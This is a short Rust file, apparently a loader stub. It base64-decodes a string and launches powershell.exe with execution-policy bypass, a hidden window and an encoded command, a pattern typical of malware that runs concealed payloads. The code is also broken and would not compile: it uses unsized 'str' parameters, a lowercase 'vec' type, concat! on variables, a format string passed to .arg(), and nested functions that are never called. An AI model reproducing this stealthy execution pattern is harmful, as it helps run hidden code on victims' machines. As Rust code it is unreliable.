extern crate base64;

use base64::decode;
use std::io;
use std::process::Command;
use std::process::Stdio;
use std::vec::Vec;

fn main(b64: str) -> Output {

    pub fn decode_bytes(b64: str) -> str {
        return decode(b64).unwrap();
    }
    pub fn execute_script(scr: str) -> vec<Stdio> {
        let quoted_scr: str = concat!("\"", scr, "\"");
        let output = Command::new("powershell.exe")
            .arg("-ExecutionPolicy Bypass")
            .arg("-NoProfile")
            .arg("-WindowStyle Hidden")
            .arg("-EC {}", quoted_scr)
            .output()
            .unwrap_or_else(|e| { panic!("failed to execute process: {}", e) });
        let ret = vec![output.stdout, output.stderr];
        return ret
    }
}
